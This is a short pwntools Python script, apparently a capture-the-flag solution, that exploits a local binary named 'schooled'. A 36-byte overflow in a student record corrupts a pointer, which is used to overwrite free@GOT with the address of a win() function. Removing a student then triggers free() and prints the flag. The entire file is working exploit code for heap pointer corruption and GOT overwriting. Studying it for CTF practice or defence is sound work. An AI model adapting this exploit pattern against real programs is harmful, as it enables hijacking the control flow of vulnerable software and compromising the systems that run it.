from pwn import *

# Addresses
win_addr = 0x08049316
free_got = 0x0804c010  # free@GOT instead of puts

context.log_level = 'info'

# Test locally first
p = process('./schooled')

# Step 1: Create student 0
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'?', b'TestName')
p.sendlineafter(b'?', b'12')
p.sendlineafter(b'?', b'3.5')

# Step 2: Modify student 0, option 1 - overwrite grade_ptr with free@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'1')

payload = b'A' * 36 + p32(free_got)
p.sendlineafter(b': ', payload)

# Step 3: Modify student 0, option 2 - write win address to free@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'2')
p.sendlineafter(b': ', str(win_addr).encode())

# Step 4: Trigger free() by removing a student
p.sendlineafter(b'> ', b'2')  # Remove student option
p.sendlineafter(b'?', b'0')   # Remove student 0

# This calls free(student), which now jumps to win()!
print("\n=== FLAG OUTPUT ===")
print(p.recvall(timeout=2).decode(errors='ignore'))

p.close()
